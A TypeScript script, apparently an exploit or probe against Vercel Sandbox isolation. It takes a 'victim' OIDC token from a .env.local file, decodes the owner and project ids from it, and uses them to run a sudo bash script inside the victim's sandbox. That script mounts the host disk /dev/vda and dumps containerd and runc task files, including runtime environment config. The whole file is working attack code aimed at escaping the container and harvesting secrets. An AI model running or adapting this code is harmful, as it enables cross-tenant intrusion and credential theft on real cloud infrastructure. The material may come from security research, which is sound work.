import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
mkdir -p /mnt/vda2
mount -t xfs /dev/vda /mnt/vda2 2>/dev/null
R=/mnt/vda2
TD=$(ls -d $R/run/containerd/io.containerd.runtime.v2.task/default/*/ 2>/dev/null | head -1)
echo "task dir: $TD"
echo "=== config.json (runtime env) ==="
cat "$TD/config.json" 2>/dev/null | head -120
echo "=== init.pid ==="
cat "$TD/init.pid" 2>/dev/null
echo "=== bootstrap.json ==="
cat "$TD/bootstrap.json" 2>/dev/null | head -40
echo "=== options.json ==="
cat "$TD/options.json" 2>/dev/null | head -40
echo "=== log.json (head) ==="
cat "$TD/log.json" 2>/dev/null | head -60
echo "=== runtime / shim-binary-path ==="
cat "$TD/runtime" "$TD/shim-binary-path" 2>/dev/null
echo "=== runc state.json ==="
cat $R/run/containerd/runc/default/*/state.json 2>/dev/null | head -40
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore24.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore24.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 90_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });